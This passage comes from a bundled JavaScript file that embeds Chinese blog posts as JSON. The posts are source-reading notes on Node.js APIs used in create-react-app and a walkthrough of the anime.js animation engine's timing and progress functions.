弹性算法</p>\\n<p>算法规定了弹性和阻力，只要提供初始位置和目标位置，即可计算出动...</p>","slug":"yuan-ma-yue-du-anime-he-react-motion-suan-fa-cha-yi","sha":"9f1747ec27f36e527867dcc4368704ce642ca78d"}')},665:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>./creat-react-app/createReactApp.js</p>\\n</blockquote>\\n<h5 id=\\"oseol\\">os.EOL</h5>\\n<pre><code><pre class=\\"hljs\\"><code>不同系统的行尾符号\\n\\n&gt; A string constant defining the operating system-specific end-of-line marker:\\n\\n`\\\\n` on POSIX\\n\\n`\\\\r\\\\n` on Windows</code></pre></code></pre><h5 id=\\"processcwd\\">process.cwd()</h5>\\n<pre><code><pre class=\\"hljs\\"><code>返回当前node进程的目录\\n\\n&gt; The process.cwd() method returns the current working directory of the Node.js process.</code></pre></code></pre><h5 id=\\"child_processspawn\\">child_process.spawn</h5>\\n<pre><code><pre class=\\"hljs\\"><code>使用给定的 command 和 args 中的命令行参数来衍生一个新进程\\n\\n例如：\\n```js\\nconst {spawn}=require(\'child_process\');\\nconst a=spawn(\'npm.cmd\',[\'config\',\'list\'])\\na.stdout.on(\'data\', (data) =&gt; {\\n  console.log(`stdout: ${data}`);\\n});\\n```\\n\\n注意，windows下要使用npm.cmd，否则会查找不到npm, \\nhttps://github.com/nodejs/node/issues/3675\\n\\n或者使用`cross-spawn`</code></pre></code></pre><h5 id=\\"semver\\">semver</h5>\\n<pre><code><pre class=\\"hljs\\"><code>进行版本号对比，官网例子备忘\\n```js\\nsemver.valid(\'1.2.3\') // \'1.2.3\'\\nsemver.valid(\'a.b.c\') // null\\nsemver.clean(\'  =v1.2.3   \') // \'1.2.3\'\\nsemver.satisfies(\'1.2.3\', \'1.x || &gt;=2.5.0 || 5.0.0 - 7.2.3\') // true\\nsemver.gt(\'1.2.3\', \'9.8.7\') // false\\nsemver.lt(\'1.2.3\', \'9.8.7\') // true\\nsemver.valid(semver.coerce(\'v2\')) // \'2.0.0\'\\nsemver.valid(semver.coerce(\'42.6.7.9.3-alpha\')) // \'42.6.7\'\\n```</code></pre></code></pre><h5 id=\\"pathdelimiter\\">path.delimiter</h5>\\n<pre><code><pre class=\\"hljs\\"><code>对不同平台的路径进行分割成数组\\n\\nWindows 上是 ;(分号)\\n\\nPOSIX 上是 :(冒号)</code></pre></code></pre><h5 id=\\"yi-ge-boolean-de-shi-yong-fang-fa\\">一个Boolean的使用方法</h5>\\n<pre><code><pre class=\\"hljs\\"><code>`process.env.NODE_PATH.split(path.delimiter).filter(Boolean)`\\n\\n这里的意思是先对`NODE_PATH`进行分割，再过滤出存在的值</code></pre></code></pre>","toc":[{"anchor":"oseol","level":5,"text":"os.EOL"},{"anchor":"processcwd","level":5,"text":"process.cwd()"},{"anchor":"child_processspawn","level":5,"text":"child_process.spawn"},{"anchor":"semver","level":5,"text":"semver"},{"anchor":"pathdelimiter","level":5,"text":"path.delimiter"},{"anchor":"yi-ge-boolean-de-shi-yong-fang-fa","level":5,"text":"一个Boolean的使用方法"}],"relatedTags":null,"created_at":"2018-07-28","timeArr":[2018,6,28,0,0,0,0],"title":"源码阅读-create-react-app一些收获(笔记备忘)","uuid":"f433b9ed4007a7781ed42e23c229928ae08ba1d8","summary":"<blockquote>\\n<p>./creat-react-app/createReactApp.js</p>\\n</blockquote>\\n<h5>os.EOL</h5>\\n<pre><code>不同系统的行尾符号\\n\\n&gt; A string constant defining the operating system-specific end-of-line marker:\\n</code></pre>\\n<p>...</p>","slug":"yuan-ma-yue-du-create-react-app-yi-xie-shou-huo-(-bi-ji-bei-wang-)","sha":"fa60cceb50a93e0f44d825b1043da061721c78f2"}')},666:function(n){n.exports=JSON.parse('{"content":"<p>本次解析将分为2篇文章，当前是第一篇，第二篇在<a href=\\"./07-21-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(2).md\\">这里</a></p>\\n<p>另外，为了能更好的理解这个库，个人写了一个此库的压缩版，实现了核心的功能(主要也是为了更好理解核心功能)，内容更少方便阅读，\\n地址在<a href=\\"https://github.com/stonehank/simplify-anime\\">这里</a></p>\\n<hr>\\n<h2 id=\\"jie-shao\\">介绍</h2>\\n<p><a href=\\"http://animejs.com/\\">anime</a>一个JS轻量动画库，摒弃了常规的<code>left,top</code>属性，全面采用<code>requestAnimateFrame+CSS3属性</code>能充分调用设备进行GPU渲染。</p>\\n<p>它的亮点有以下(直接引用官网)：</p>\\n<blockquote>\\n<ul>\\n<li>Keyframes(帧动画): Chain multiple animation properties.</li>\\n<li>Timeline(同步动画): Synchronize multiple instances together.</li>\\n<li>Playback controls(暂停回放功能): Play, pause, restart, seek animations or timelines.</li>\\n<li>CSS transforms(CSS动画): Animate CSS transforms individually.</li>\\n<li>Function based values(函数定义配置(注入了内部属性)): Multiple animated targets can have individual value.</li>\\n<li>SVG Animations(SVG动画): Motion path, line drawing and morphing animations.</li>\\n<li>Easing functions(自定义贝塞尔函数): Use the built in functions or create your own Cubic Bézier curve easing.</li>\\n</ul>\\n</blockquote>\\n<p>这么多亮点，其实关键函数就3~4个。</p>\\n<p>因为这里都是使用缓动函数算法，也就是通过 <code>初始位置</code>, <code>结束位置</code>, <code>持续时间</code>,<code>已消耗的时间</code> 计算出当前所在位置。</p>\\n<p><code>初始位置</code>、<code>结束位置</code>和<code>持续时间</code>是作为参数传入配置的，因此计算<code>已消耗时间</code>就是完成动画的核心。  </p>\\n<p>下面就深入了解下它的核心。</p>\\n<h2 id=\\"shen-ru-li-jie\\">深入理解</h2>\\n<p>先了解几个时间的变量，动画都是<code>算法+时间=位置</code>这么算出来的：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 记录当前位置所对应的时间，根据lastTime计算</span>\\ninstance.cuurentTime\\n<span class=\\"hljs-comment\\">// 记录当前位置所消耗的时间</span>\\nengineTime\\n<span class=\\"hljs-comment\\">// 记录上一次计算完毕赋值后的位置对应时间</span>\\nlastTime\\n<span class=\\"hljs-comment\\">// 上一次调用raf的时间</span>\\nstartTime\\n<span class=\\"hljs-comment\\">// 当前位置所消耗时间(能匹配反转状态)，根据engineTime计算</span>\\ninsTime\\n<span class=\\"hljs-comment\\">// 动画持续时间</span>\\ninsDuration\\n<span class=\\"hljs-comment\\">// 延迟时间</span>\\ndelay\\n<span class=\\"hljs-comment\\">// 从什么时间点开始动画</span>\\ninsOffset</code></pre></code></pre>\\n<p>接着看几个关键函数，这里先不放具体代码，只是先知道是做什么的(按一个正常动画顺序排放)：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// anime的核心机制, 递归调用raf执行(关键)</span>\\n<span class=\\"hljs-keyword\\">const</span> engine = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">(</span>) =&gt;</span> {\\n  <span class=\\"hljs-comment\\">// ...requestAnimateFrame</span>\\n})();\\n\\n<span class=\\"hljs-comment\\">// anime主体</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">anime</span>(<span class=\\"hljs-params\\">params</span>)</span>{\\n\\n  <span class=\\"hljs-comment\\">// 定义instance 也是最终返回值</span>\\n  <span class=\\"hljs-keyword\\">let</span> instance = createNewInstance(params);\\n\\n  <span class=\\"hljs-comment\\">// 外部API 从当前位置开始执行动画</span>\\n  instance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 配置 startTime 和 engineTime(关键)</span>\\n   instance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 对当前engineTime进行判断，确定动画方案(关键)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 计算动画当前位置 并且赋值(关键)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>)</span>{}\\n\\n  <span class=\\"hljs-comment\\">// 直接跳到参数time的时间所在的位置</span>\\n  instance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 暂停</span>\\n  instance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 反转</span>\\n  instance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API reset</span>\\n  instance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 重新开始</span>\\n  instance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> instance\\n}</code></pre></code></pre>\\n<p>关键函数就4个，其他都是一些对关键函数的具体使用</p>\\n<p>接着一个个解析：</p>\\n<ul>\\n<li>createNewInstance</li>\\n</ul>\\n<p>其实就是对属性和方法合并成一个整体对象，这个对象是贯穿全局的，因此里面什么都有...</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createNewInstance</span>(<span class=\\"hljs-params\\">params</span>) </span>{\\n\\n    <span class=\\"hljs-comment\\">/* 对params进行处理 */</span>\\n    <span class=\\"hljs-keyword\\">const</span> instanceSettings = replaceObjectProps(defaultInstanceSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> tweenSettings = replaceObjectProps(defaultTweenSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> animatables = getAnimatables(params.targets);\\n    <span class=\\"hljs-keyword\\">const</span> properties = getProperties(instanceSettings, tweenSettings, params);\\n    <span class=\\"hljs-keyword\\">const</span> animations = getAnimations(animatables, properties);\\n\\n    <span class=\\"hljs-comment\\">// mergeObjects(o1,o2)相当于 Object.assing({},o2,o1)</span>\\n    <span class=\\"hljs-keyword\\">return</span> mergeObjects(instanceSettings, {\\n      <span class=\\"hljs-attr\\">children</span>: [],\\n      <span class=\\"hljs-attr\\">animatables</span>: animatables,\\n      <span class=\\"hljs-attr\\">animations</span>: animations,\\n      <span class=\\"hljs-attr\\">duration</span>: getInstanceTimings(<span class=\\"hljs-string\\">\'duration\'</span>, animations, instanceSettings, tweenSettings),\\n      <span class=\\"hljs-attr\\">delay</span>: getInstanceTimings(<span class=\\"hljs-string\\">\'delay\'</span>, animations, instanceSettings, tweenSettings)\\n    });\\n  }</code></pre></code></pre>\\n<ul>\\n<li>instance.play</li>\\n</ul>\\n<p>此处先做了防护，只有paused状态下才会执行，<code>lastTime</code>这里是调取当前动画的位置对应的时间，因此才可以实现从任意位置开始动画。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-comment\\">// 外部API 从当前位置开始执行动画</span>\\ninstance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (!instance.paused) <span class=\\"hljs-keyword\\">return</span>;\\n  instance.paused = <span class=\\"hljs-literal\\">false</span>;\\n  <span class=\\"hljs-comment\\">// 从0 开始</span>\\n  startTime = <span class=\\"hljs-number\\">0</span>;\\n  <span class=\\"hljs-comment\\">// 调取当前动画当前位置所对应的时间</span>\\n  lastTime = adjustTime(instance.currentTime);\\n  <span class=\\"hljs-comment\\">// 给 activeInstances 添加当前实例，说明这是一个正在运行的动画</span>\\n  activeInstances.push(instance);\\n  <span class=\\"hljs-comment\\">// raf未启动，调用engine</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!raf) engine();\\n}</code></pre></code></pre>\\n<ul>\\n<li>engine</li>\\n</ul>\\n<p>anime的核心机制，通过递归调用<code>requestAnimateFrame</code>，当检测到需要执行动画的集合<code>activeInstances</code>有值，调用instance.tick。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-comment\\">// IIFE 之后调用engine相当于执行内部的play</span>\\n  <span class=\\"hljs-keyword\\">const</span> engine = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">(</span>) =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// step收到一个参数，</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">play</span>(<span class=\\"hljs-params\\"></span>) </span>{ raf = requestAnimationFrame(step); };\\n    <span class=\\"hljs-comment\\">// 这里的参数t是 raf的参数中可以接受的一个时间戳，表示触发调用的时间</span>\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">step</span>(<span class=\\"hljs-params\\">t</span>) </span>{\\n      <span class=\\"hljs-comment\\">// activeInstances指正在被执行的动画集合</span>\\n      <span class=\\"hljs-keyword\\">const</span> activeLength = activeInstances.length;\\n      <span class=\\"hljs-comment\\">// 存在正在运行的动画</span>\\n      <span class=\\"hljs-keyword\\">if</span> (activeLength) {\\n        <span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>;\\n        <span class=\\"hljs-keyword\\">while</span> (i &lt; activeLength) {\\n          <span class=\\"hljs-comment\\">// 调用tick执行</span>\\n          <span class=\\"hljs-keyword\\">if</span> (activeInstances[i]) activeInstances[i].tick(t);\\n          i++;\\n        }\\n        play();\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// 不存在正在运行的动画 cancel</span>\\n        cancelAnimationFrame(raf);\\n        raf = <span class=\\"hljs-number\\">0</span>;\\n      }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> play;\\n  })();</code></pre></code></pre>\\n<ul>\\n<li>instance.tick</li>\\n</ul>\\n<p>tick的作用通过参数<code>t</code>，<code>raf</code>的一个时间戳概念，计算出距离上一次调用实际消耗的时间<code>engineTime</code>。</p>\\n<p>例如：上一次调用时间戳是<code>1000</code>，也就是1秒，中途突然执行一个巨大的任务，等任务结束，时间戳是<code>20000</code>，\\n那么这次的<code>engineTime</code>就是<code>lastTime+20000-1000</code>，也就是计算这次动画从上次位置再加上19秒的位置...\\n那么anime对于这种情况是怎么处理呢?继续看下一个<code>setInstanceProgress</code>。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 配置 startTime 和 engineTime</span>\\ninstance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{\\n  now = t;\\n  <span class=\\"hljs-comment\\">// startTime 如果首次执行 就是now，否则就是上一次tick的时间</span>\\n  <span class=\\"hljs-keyword\\">if</span> (!startTime) startTime = now;\\n  <span class=\\"hljs-comment\\">// lastTime 是上一次执行结束后动画对应位置的时间戳</span>\\n  <span class=\\"hljs-comment\\">// engineTime 是到动画目前为止消耗的总时间，一般理论上讲是lastTime+16.6667</span>\\n  <span class=\\"hljs-keyword\\">const</span> engineTime = (lastTime + now - startTime) * anime.speed;\\n  setInstanceProgress(engineTime);\\n}</code></pre></code></pre>\\n<ul>\\n<li>setInstanceProgress</li>\\n</ul>\\n<p>这个函数接受一个消耗的时间值，在内部对其进行适配和定义了各种情况的动画起始点，传递给<code>setAnimationsProgress</code>。</p>\\n<p>例如，上面那个例子，如果消耗了19秒，就如进入这个判断:从结束点开始动画(考虑reverse的情况)。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 消耗的时间超出了持续时间 并且当前位置不在终点  或者 未设定持续时间</span>\\n<span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration){\\n  <span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration) {\\n    <span class=\\"hljs-comment\\">// 从结束点开始</span>\\n    setAnimationsProgress(insDuration);\\n    <span class=\\"hljs-keyword\\">if</span> (!insReversed) countIteration();\\n  }\\n}</code></pre></code></pre>\\n<p>setInstanceProgress(省略了一些配置的定义)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 对当前engineTime进行判断，确定动画方案</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{\\n  <span class=\\"hljs-comment\\">// 动画持续时间</span>\\n  <span class=\\"hljs-keyword\\">const</span> insDuration = instance.duration;\\n  <span class=\\"hljs-comment\\">// 从什么时间点开始动画</span>\\n  <span class=\\"hljs-keyword\\">const</span> insOffset = instance.offset;\\n  <span class=\\"hljs-comment\\">// 加上延迟后的开始时间</span>\\n  <span class=\\"hljs-keyword\\">const</span> insStart = insOffset + instance.delay;\\n  <span class=\\"hljs-comment\\">// 记录当前位置所对应的时间</span>\\n  <span class=\\"hljs-keyword\\">const</span> insCurrentTime = instance.currentTime;\\n  <span class=\\"hljs-comment\\">// 是否是反转状态</span>\\n  <span class=\\"hljs-keyword\\">const</span> insReversed = instance.reversed;\\n  <span class=\\"hljs-comment\\">// 当前位置所消耗时间(能匹配反转状态)</span>\\n  <span class=\\"hljs-comment\\">// 这里adjustTime就是如果是反转状态，则返回 insDuration-engineTime</span>\\n  <span class=\\"hljs-keyword\\">const</span> insTime = adjustTime(engineTime);\\n  <span class=\\"hljs-comment\\">/* ... */</span>\\n  <span class=\\"hljs-comment\\">// 消耗的时间大于应该开始的时间 并且 消耗的时间在持续时间范围内</span>\\n  <span class=\\"hljs-keyword\\">if</span> (insTime &gt; insOffset &amp;&amp; insTime &lt; insDuration) {\\n    setAnimationsProgress(insTime);\\n  } <span class=\\"hljs-keyword\\">else</span> {\\n    <span class=\\"hljs-comment\\">// 消耗的时间小于应该开始的时间 并且 当前位置不在起点</span>\\n    <span class=\\"hljs-keyword\\">if</span> (insTime &lt;= insOffset &amp;&amp; insCurrentTime !== <span class=\\"hljs-number\\">0</span>) {\\n      <span class=\\"hljs-comment\\">// 从头开始</span>\\n      setAnimationsProgress(<span class=\\"hljs-number\\">0</span>);\\n      <span class=\\"hljs-keyword\\">if</span> (insReversed) countIteration();\\n    }\\n    <span class=\\"hljs-comment\\">// 消耗的时间超出了持续时间 并且当前位置不在终点  或者 未设定持续时间</span>\\n    <span class=\\"hljs-keyword\\">if</span> ((insTime &gt;= insDuration &amp;&amp; insCurrentTime !== insDuration) || !insDuration) {\\n      <span class=\\"hljs-comment\\">// 从结束点开始</span>\\n      setAnimationsProgress(insDuration);\\n      <span class=\\"hljs-keyword\\">if</span> (!insReversed) countIteration();\\n    }\\n  }\\n  setCallback(<span class=\\"hljs-string\\">\'update\'</span>);\\n  <span class=\\"hljs-comment\\">// 消耗时间大于持续时间 并且在终点(不在终点的上面已经判断了)</span>\\n  <span class=\\"hljs-keyword\\">if</span> (engineTime &gt;= insDuration) {\\n    <span class=\\"hljs-keyword\\">if</span> (instance.remaining) {\\n      startTime = now;\\n      <span class=\\"hljs-keyword\\">if</span> (instance.direction === <span class=\\"hljs-string\\">\'alternate\'</span>) toggleInstanceDirection();\\n      <span class=\\"hljs-comment\\">// remaining为false，remaining&gt;0说明还需要继续动画</span>\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-comment\\">// 完成动画的执行</span>\\n      instance.pause();\\n      <span class=\\"hljs-keyword\\">if</span> (!instance.completed) {\\n        instance.completed = <span class=\\"hljs-literal\\">true</span>;\\n        setCallback(<span class=\\"hljs-string\\">\'complete\'</span>);\\n        <span class=\\"hljs-keyword\\">if</span> (<span class=\\"hljs-string\\">\'Promise\'</span> <span class=\\"hljs-keyword\\">in</span> <span class=\\"hljs-built_in\\">window</span>) {\\n          resolve();\\n          promise = makePromise();\\n        }\\n      }\\n    }\\n    lastTime = <span class=\\"hljs-number\\">0</span>;\\n  }\\n}</code></pre></code></pre>\\n<p>关键函数<code>setAnimationsProgress</code>和后续的操作函数都放在下一篇继续解析。</p>\\n","toc":[{"anchor":"jie-shao","level":2,"text":"介绍"},{"anchor":"shen-ru-li-jie","level":2,"text":"深入理解"}],"relatedTags":null,"created_at":"2018-07-20","timeArr":[2018,6,20,0,0,0,0],"title":"源码阅读-解析anime核心(1)","uuid":"631c6ad421f436a2f8a59b287261b6a4cdaae80d","summary":"<p>本次解析将分为2篇文章，当前是第一篇，第二篇在<a href=\\"./07-21-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(2).md\\">这里</a></p>\\n<p>另外，为了能更好的理解这个库，个人写了一个此库的压缩版，实现了核心的功能(主要也是为了更好理解核心功能)，内容更少方便阅读，\\n地址在[这里](https://github.com/stonehank/simpli...</p>","slug":"yuan-ma-yue-du-jie-xi-anime-he-xin-(1)","sha":"2841c2c60ffc45abdca1ed525155f5b777ed54c7"}')},667:function(n){n.exports=JSON.parse('{"content":"<p>本次解析将分为2篇文章，当前是第二篇，第一篇在<a href=\\"./07-20-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(1).md\\">这里</a></p>\\n<p>另外，为了能更好的理解这个库，个人写了一个此库的压缩版，实现了核心的功能(主要也是为了更好理解核心功能)，内容更少方便阅读，\\n地址在<a href=\\"https://github.com/stonehank/simplify-anime\\">这里</a></p>\\n<hr>\\n<p>继续上一篇，先把结构图拉过来：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// anime主体</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">anime</span>(<span class=\\"hljs-params\\">params</span>)</span>{\\n\\n  <span class=\\"hljs-comment\\">// 定义instance 也是最终返回值</span>\\n  <span class=\\"hljs-keyword\\">let</span> instance = createNewInstance(params);\\n\\n  <span class=\\"hljs-comment\\">// 外部API 从当前位置开始执行动画</span>\\n  instance.play = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 配置 startTime 和 engineTime(关键)</span>\\n   instance.tick = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">t</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 对当前engineTime进行判断，确定动画方案(关键)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setInstanceProgress</span>(<span class=\\"hljs-params\\">engineTime</span>) </span>{}\\n\\n  <span class=\\"hljs-comment\\">// 计算动画当前位置 并且赋值(关键)</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>)</span>{}\\n\\n  <span class=\\"hljs-comment\\">// 直接跳到参数time的时间所在的位置</span>\\n  instance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 暂停</span>\\n  instance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 反转</span>\\n  instance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API reset</span>\\n  instance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">// 外部API 重新开始</span>\\n  instance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> instance\\n}</code></pre></code></pre>\\n<ul>\\n<li>setAnimationsProgress(省略了一些配置的定义)</li>\\n</ul>\\n<p>这个函数接受一个参数，就是当前位置所消耗时间(动画起始点)，然后在里面计算出每一个动画目标的位置，并且赋值</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 计算动画当前位置 并且赋值</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">setAnimationsProgress</span>(<span class=\\"hljs-params\\">insTime</span>) </span>{\\n  <span class=\\"hljs-comment\\">/* ... */</span>\\n  <span class=\\"hljs-comment\\">// 这个while逐个计算当前实例中的每个动画的当前位置(通过时间和算法)</span>\\n  <span class=\\"hljs-keyword\\">while</span> (i &lt; animationsLength) {\\n      <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// 消耗的时间占总持续时间的比例 在起点终点之间</span>\\n    <span class=\\"hljs-keyword\\">const</span> elapsed = minMaxValue(insTime - tween.start - tween.delay, <span class=\\"hljs-number\\">0</span>, tween.duration) / tween.duration;\\n    <span class=\\"hljs-comment\\">// 通过算法计算当前进度</span>\\n    <span class=\\"hljs-keyword\\">const</span> eased = <span class=\\"hljs-built_in\\">isNaN</span>(elapsed) ? <span class=\\"hljs-number\\">1</span> : tween.easing(elapsed, tween.elasticity);\\n    <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// 遍历每一个到达点执行</span>\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> n = <span class=\\"hljs-number\\">0</span>; n &lt; toNumbersLength; n++) {\\n      <span class=\\"hljs-keyword\\">let</span> value;\\n      <span class=\\"hljs-keyword\\">const</span> toNumber = tween.to.numbers[n];\\n      <span class=\\"hljs-keyword\\">const</span> fromNumber = tween.from.numbers[n];\\n      <span class=\\"hljs-keyword\\">if</span> (!tween.isPath) {\\n        <span class=\\"hljs-comment\\">// 计算当前具体位置</span>\\n        value = fromNumber + (eased * (toNumber - fromNumber));\\n      } <span class=\\"hljs-keyword\\">else</span> {\\n        <span class=\\"hljs-comment\\">// 进行SVG path计算</span>\\n        value = getPathProgress(tween.value, eased * toNumber);\\n      }\\n      <span class=\\"hljs-comment\\">/* ... */</span>\\n      numbers.push(value);\\n    }\\n         <span class=\\"hljs-comment\\">/* ... */</span>\\n        <span class=\\"hljs-keyword\\">if</span> (!<span class=\\"hljs-built_in\\">isNaN</span>(n)) {\\n          <span class=\\"hljs-comment\\">// 组合单位 \'135.546\'+\'px\'</span>\\n          <span class=\\"hljs-keyword\\">if</span> (!b) {\\n            progress += n + <span class=\\"hljs-string\\">\' \'</span>;\\n          } <span class=\\"hljs-keyword\\">else</span> {\\n            progress += n + b;\\n          }\\n        }\\n    <span class=\\"hljs-comment\\">/* ... */</span>\\n    <span class=\\"hljs-comment\\">// 组合结果 \'translateX(\'+\'135.546px\'+\')`</span>\\n    setTweenProgress[anim.type](animatable.target, anim.property, progress, transforms, animatable.id);\\n    anim.currentValue = progress;\\n    i++;\\n  }\\n  <span class=\\"hljs-comment\\">// 遍历结果，逐个target赋值</span>\\n  <span class=\\"hljs-keyword\\">const</span> transformsLength = <span class=\\"hljs-built_in\\">Object</span>.keys(transforms).length;\\n  <span class=\\"hljs-keyword\\">if</span> (transformsLength) {\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> id = <span class=\\"hljs-number\\">0</span>; id &lt; transformsLength; id++) {\\n      <span class=\\"hljs-keyword\\">if</span> (!transformString) {\\n        <span class=\\"hljs-keyword\\">const</span> t = <span class=\\"hljs-string\\">\'transform\'</span>;\\n        <span class=\\"hljs-comment\\">// 配置兼容性</span>\\n        transformString = (getCSSValue(<span class=\\"hljs-built_in\\">document</span>.body, t) ? t : <span class=\\"hljs-string\\">`-webkit-<span class=\\"hljs-subst\\">${t}</span>`</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// 设置style</span>\\n      instance.animatables[id].target.style[transformString] = transforms[id].join(<span class=\\"hljs-string\\">\' \'</span>);\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// 记录当前位置所对应的时间</span>\\n  instance.currentTime = insTime;\\n  <span class=\\"hljs-comment\\">// 设置进度</span>\\n  instance.progress = (insTime / instance.duration) * <span class=\\"hljs-number\\">100</span>;\\n}</code></pre></code></pre>\\n<p>剩下的就是一些操作函数了：</p>\\n<ul>\\n<li><p>instance.seek </p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 直接跳到参数time的时间所在的位置</span>\\ninstance.seek = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">time</span>) 